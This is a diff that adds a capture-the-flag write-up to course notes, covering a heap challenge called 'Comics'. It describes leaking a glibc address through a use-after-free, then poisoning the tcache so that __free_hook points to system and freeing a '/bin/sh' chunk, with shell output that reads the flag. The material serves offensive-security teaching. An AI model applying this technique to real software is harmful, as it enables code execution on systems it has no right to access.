@@ -333,3 +333,79 @@ $ cat flag.txt
     b'flag{Unb07h3r3d_AND_f0cus3d!_b61153d8151fe78e}\n'
 flag{Unb07h3r3d_AND_f0cus3d!_b61153d8151fe78e}
 ```
+
+## challenge - Comics
+```
+Make your own Cyanide and Happiness comic to poison tcache and get the flag!
+
+nc offsec-chalbroker.osiris.cyber.nyu.edu 1214
+```
+
+Inspecting the binary:
+```aiignore
+$ checksec comics
+[*] '/mnt/csgy9223_IntroOffSec/week_8/comics'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+Running the binary:
+```aiignore
+./comics
+My favorite comic is Cyanide and Happiness! Can you help me create
+a new comic using this template of Greenshirt and a computer??
+Please select an option?
+1. Create a new comic
+2. Print a comic
+3. Edit a comic
+4. Delete a comic
+>
+```
+
+Another menu-driven interactive binary. Let's look at it in binja.
+
+Looks the the address of each commic created is stored in an array called comics. The size of each element in the array is 8 bytes.
+
+First plan of attack is to leak a glibc address. This can be done by creating a larger 0x410 to get an unsorted bin address. Since this binary has the same flaw as the last one, even after a comic is deleted, it can be referenced by index. We'll need to setup a guard to make sure the space is not reclaimed. We'll crate 3 comics:
+
+- add_comic(p, b"A" * 0x410)  # comic 1 (0))
+- add_comic(p, b"B" * 0x40)  # comic 2 (1)
+- add_comic(p, b"C" * 0x40)  # comic 3 (2)
+
+The first one is to leak a glibc address, the 2nd two are to create a guard and poison tcache to point free_hook to system.
+
+Leaking the glibc address I need to get the address of the arena, the compute the difference between that page address and glibc. This will take some parsing of a very artistic display, but the results are:
+
+```aiignore
+comic: 0x7f8ecae14be0
+glibc_base: 0x7f8ecac28000 = (glibc_leak & ~0xfff) - 0x1ec000
+```
+Next we mess with the comics create at index 1 and 2. We delete both, then edit the 2nd one (index 2) to set the address of free_hook. Once this id done we add a new comic, with the same size as the original 2 to poison the tcache struct. After this we add another comic with the address of system, also carefully using the right size so we get the other free space.
+
+Once this is done, we edit either of the 2 comics with the '/bin/sh' string then delete that comic.
+
+This pops a shell and...
+
+Results:
+```aiignore
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    b'ls\n'
+[DEBUG] Received 0x10 bytes:
+    b'comics\n'
+    b'flag.txt\n'
+comics
+flag.txt
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    b'cat flag.txt\n'
+[DEBUG] Received 0x3c bytes:
+    b'flag{T_c4ch3_p0150n1ng_15_s000000_c0mic4l_778861caf58fdda7}\n'
+flag{T_c4ch3_p0150n1ng_15_s000000_c0mic4l_778861caf58fdda7}
+```
